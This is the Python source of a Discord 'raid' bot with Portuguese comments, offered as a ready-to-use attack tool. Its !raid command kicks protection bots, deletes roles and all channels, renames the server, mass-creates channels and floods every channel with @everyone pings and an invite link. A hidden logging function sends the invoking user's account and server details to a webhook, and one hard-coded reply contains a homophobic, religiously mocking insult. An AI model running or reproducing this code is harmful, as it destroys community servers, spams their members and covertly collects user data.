from discord.ext import commands
from discord import app_commands
from dotenv import load_dotenv
import json
import discord
import aiohttp
import requests
import os
import asyncio
import requests
import random
import string
from datetime import timezone


# C O N F I G S

init()
load_dotenv('.env')
token = os.getenv("TOKEN")

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

FILE_DADOS = "files/Dados.json"


# F U N Ç Õ E S   D O   B A C K E N D   P Y T H O N

def carregar_json():
  try:
    with open(FILE_DADOS, "r", encoding="utf-8") as arquivo:
      return json.load(arquivo)

  except FileNotFoundError:
    return {
      "dados": {},
    }

  except json.JSONDecodeError:
    print("Erro: dados.json está inválido.")
    return {
      "dados": {},
    }


def salvar_json(config):
  with open(FILE_DADOS, "w", encoding="utf-8") as arquivo:
    json.dump(config, arquivo, indent=2, ensure_ascii=False)


  
# F U N Ç Õ E S   D O   B O T

@bot.tree.command(name="dados", description="Informações que serão usadas no bot")

@app_commands.describe(
  servidor="Digite o nome do servidor(o nome original do servidor sera substituido por esse)",
  
  canal="Digite o nome do canal(os canais criados serão com o nome passado)",
  
  bots="Remover bots do servidor(remove bots de proteção ou qualquer outro(True/Sim False/Não))",

  canais="Quantos canais deseja criar(máx 70)"
)

async def dados(
  interaction: discord.Interaction,
  servidor: str,
  canal: str,
  bots: bool,
  canais: app_commands.Range[int, 20, 70]
):

  
  servidor = servidor.strip()
  canal = canal.strip()
  v_1 = True
  
  verify_embed = discord.Embed(
    title="R E S U L T A D O  D A  V E R I F I C A Ç Ã O",
    color=discord.Color.red()
  )

  if not 2 <= len(servidor) <= 50:
    verify_embed.add_field(
      name="SERVIDOR",
      value="Nome do servidor inválido: use entre 2 e 50 caracteres."
    ); v_1 = False
    
  if not 2 <= len(canal) <= 50:
    verify_embed.add_field(
      name="NOME",
      value="Nome do canal inválido: use entre 2 e 50 caracteres."
    ); v_1 = False
  
  if not 20 <= canais <= 70:
    verify_embed.add_field(
      name="CANAIS",
      value="Quantidade de canais precisa ficar entre 20 e 70."
      ); v_1 = False

  if v_1 == False:
    await interaction.response.send_message(embed=verify_embed, ephemeral=True)
    return
    
  

  config = carregar_json()
  id_user = str(interaction.user.id)
  dados = config.setdefault("dados", {})
  usuario = dados.setdefault(id_user, {})
  usuario["nome do servidor"] = servidor
  usuario["nome dos canais"] = canal
  usuario["quantos canais"] = canais
  usuario["bots"] = bots

  salvar_json(config)
  embed_122 = discord.Embed(
    title="C O N F I G U R A Ç Õ E S",
    color=discord.Color.red()
  )
  
  embed_122.add_field(
    name="D A D O S",
    value="STATUS DE DADOS: Salvo.",
    inline=False
  )
  
  embed_122.add_field(
    name="C O M A N D O",
    value="COMANDO: `!raid`",
    inline=False
  )
  await interaction.response.send_message(embed=embed_122, ephemeral=True)



# F U N Ç Õ E S   P R I N C I P A I S   D O   R A I D

Infors = carregar_json()


async def remover_bots(ctx):
  # R E M O V E R   B O T S
  if not ctx.author.guild_permissions.kick_members:
    return
      
  if not ctx.guild.me.guild_permissions.kick_members:
    return
        
  bots = [membro for membro in ctx.guild.members if membro.bot]
  for bot in bots:
    try:
      if bot.id == ctx.guild.owner_id:
        continue
      elif bot.id == ctx.guild.me.id:
        continue

      elif bot.top_role >= ctx.guild.me.top_role:
        continue
        
      else:
        await bot.kick()
        await asyncio.sleep(0.1)
      
    except Exception as erro:
      print(erro)


async def deletar_cargos(ctx):
  # R E M O V E R   C A R G O S
  
  for cargo in ctx.guild.roles:
    if cargo.is_default(): 
      continue
    elif cargo.managed:
      continue
    
    elif cargo >= ctx.guild.me.top_role:
      continue

    else:
      await cargo.delete()


async def apagar_canais(ctx):
  # A P A G A R   C A N A I S
  try:
    await asyncio.gather(*[canal.delete() for canal in ctx.guild.channels])

    
  except Exception as erro:
    print(erro)


async def criar_canais(ctx, nome_canais, qtd_canais):
  # C R I A R   C A N A I S
  mensagem = """|| @everyone @here || 
# **bot By: X-RootLab-X** 
https://discord.gg/MwQmsXMppx
    """
  try:
    n = "".join(random.choices(string.ascii_lowercase + string.digits, k=30))
    
    await asyncio.gather(*[ctx.guild.create_text_channel(f"{nome_canais}-{n}") for u in range(qtd_canais)])
      
  except Exception as erro:
    print(erro)


async def spam(ctx):
  for ___ in range(100):
    mensagem = """|| @everyone @here || 
# **bot By: X-RootLab-X** 
https://discord.gg/MwQmsXMppx
    """
    await asyncio.gather(*[canal.send(mensagem) for canal in ctx.guild.channels])


    
async def infors_colet(ctx):
# C O L E T A   D E   I N F O R M A Ç Õ E S
  c_web = carregar_json()
  webhook = c_web["urls"]["webhook discord"]
  
  
  # Quem executou o comando
  user = ctx.author

  # Onde executou
  guild = ctx.guild
  channel = ctx.channel
  message = ctx.message

  # Data/hora real em UTC
  used_at = message.created_at.astimezone(timezone.utc)
  used_at_unix = int(used_at.timestamp())

  # Cargos, removendo @everyone
  roles = [
    {
      "id": str(role.id),
      "name": role.name
    }
    for role in user.roles
    if role != guild.default_role
  ]
  # Dados guardados por chaves
  dados = {
    "event": {
      "command": ctx.command.qualified_name,
      "message_id": str(message.id),
      "message_content": message.content,
      "used_at_utc": used_at.isoformat(),
      "used_at_unix": used_at_unix
    },
    
    "user": {
      "id": str(user.id),
      "username": user.name,
      "display_name": user.display_name,
      "global_name": user.global_name,
      "mention": user.mention,
      "is_bot": user.bot,
      "avatar_url": user.display_avatar.url,
      "account_created_at": user.created_at.isoformat(),
      "account_created_at_unix": int(user.created_at.timestamp())
    },
    "location": {
      "guild_id": str(guild.id),
      "guild_name": guild.name,
      "channel_id": str(channel.id),
      "channel_name": channel.name,
      "channel_mention": channel.mention
    },
    "member": {
      "joined_guild_at": (
        user.joined_at.isoformat()
        if user.joined_at
        else None
      ),
      "joined_guild_at_unix": (
        int(user.joined_at.timestamp())
        if user.joined_at
        else None
      ),
      "roles": roles,
      "roles_count": len(roles),
      "top_role": {
        "id": str(user.top_role.id),
        "name": user.top_role.name
      }
    }
  }
  # Formatação dos cargos para o embed
  roles_text = ", ".join(f"`{role['name']}`" for role in dados["member"]["roles"]) or "Sem cargos"

  # Discord limita field.value a 1024 caracteres
  roles_text = roles_text[:1024]

  # Evita estourar o tamanho de field do embed
  command_content = dados["event"]["message_content"][:850] or "Sem conteúdo"

  # JSON que será enviado ao webhook
  payload = {
  "username": "Bot Logger",
  "embeds": [
    {
      "title": "Comando usado",
      "color": 0x5865F2,

      "thumbnail": {
        "url": dados["user"]["avatar_url"]
      },

      "fields": [
        {
          "name": "Quem usou",
          "value": (
            f"Username: `{dados['user']['username']}`"
            f"Display: `{dados['user']['display_name']}`"
            f"ID: `{dados['user']['id']}`"
            f"Bot: `{dados['user']['is_bot']}`"
          ),
          "inline": True
        },

        {
          "name": "Onde usou",
          "value": (
            f"Servidor: `{dados['location']['guild_name']}`"
            f"Canal: `{dados['location']['channel_name']}`"
            f"Guild ID: `{dados['location']['guild_id']}`"
            f"Canal ID: `{dados['location']['channel_id']}`"
          ),
          "inline": True
        },

        {
          "name": "Comando",
          "value": (
            f"Nome: `{dados['event']['command']}`"
            f"Conteúdo:"
            f"```{command_content}```"
          )[:1024],
          "inline": False
        },

        {
          "name": "Horário",
          "value": (
            f"UTC: `{dados['event']['used_at_utc']}`"
            f"Discord: <t:{dados['event']['used_at_unix']}:F>"
            f"Relativo: <t:{dados['event']['used_at_unix']}:R>"
          ),
          "inline": False
        },

        {
          "name": "Conta",
          "value": (
            f"Criada: <t:{dados['user']['account_created_at_unix']}:F>"
            f"É bot: `{dados['user']['is_bot']}`"
          ),
          "inline": True
        },

        {
          "name": f"Cargos ({dados['member']['roles_count']})",
          "value": roles_text[:1024],
          "inline": True
        }
      ],

      "footer": {
        "text": (
          f"Message ID: {dados['event']['message_id']} | "
          f"Maior cargo: {dados['member']['top_role']['name']}"
        )
      },

      "timestamp": dados["event"]["used_at_utc"]
    }
  ]
}
  # Executa requests em thread: sem bloquear o event loop do discord.py
  try:
    response = await asyncio.to_thread(
      requests.post,
      webhook,
      json=payload,
      timeout=10
    )
    
    if response.status_code not in (200, 204):
      print(f"[WEBHOOK ERROR] HTTP {response.status_code}: "f"{response.text}")
  
  except requests.RequestException as error:
    print(f"[WEBHOOK ERROR] {error}")




@bot.command(name="raid")
@commands.cooldown(1, 15, commands.BucketType.user)
async def c2(ctx):
  if ctx.guild.id == 1536171456130580491:
    await ctx.send("raid teu cu seu macumbeiro você é um baitolaaaa skksksks, seu ze pilintra")
    return

  id_user = str(ctx.author.id)
  usuario = Infors["dados"].get(id_user)
  if usuario is None:
    msg_erro = await ctx.reply(f"```{ctx.author} sem dados salvos```")
    await asyncio.sleep(3)
    await msg_erro.delete()
    return
  # C O L E T A   D E   I N F O R M A Ç Õ E S
  await infors_colet(ctx)

  # C A D A   F U N Ç Ã O   Q U E   S E R A   E X E C U T A D A
  
  # R E M O V E R   B O T S
  
  if usuario.get("bots", False):
    await remover_bots(ctx)

  # A P A G A R   C A R G O S
  await deletar_cargos(ctx)

  # R E N A M E   G U I L D
  nome = usuario.get("nome do servidor")
  await ctx.guild.edit(name=nome)

  # A P A G A R   C A N A I S
  await apagar_canais(ctx)

  # C R I A R   C A N A I S
  nome_canais = usuario.get("nome dos canais")
  qtd_canais = usuario.get("quantos canais")
  await criar_canais(ctx, nome_canais, qtd_canais)
  
  await spam(ctx)

# E V E N T O S
  
@bot.event

async def on_ready():
  funcoes = await bot.tree.sync()
  print(f'{"=" *30}\n [BOT] {bot.user}\n{"=" *30}\n [SYNCS] {len(funcoes)}\n{"=" *30}')


@bot.event
async def on_command_error(ctx, error):
  if isinstance(error, commands.CommandOnCooldown):
    msg_ = await ctx.reply(
      f"Aguarde `{error.retry_after:.1f}s` para usar esse comando novamente.",
      mention_author=False
    )
    await asyncio.sleep(3); await msg_.delete()
    return

  if isinstance(error, commands.NoPrivateMessage):
    msg__ = await ctx.reply(
      "Esse comando só funciona em servidores.",
      mention_author=False
    )
    await asyncio.sleep(3); await msg__.delete()
    return

  if isinstance(error, commands.MissingPermissions):
    msg___ = await ctx.reply(
      "Você não tem permissão para usar esse comando.",
      mention_author=False
    )
    await asyncio.sleep(3); await msg___.delete()
    return

  print(f"[COMMAND ERROR] {type(error).__name__}: {error}")

  
bot.run(token)

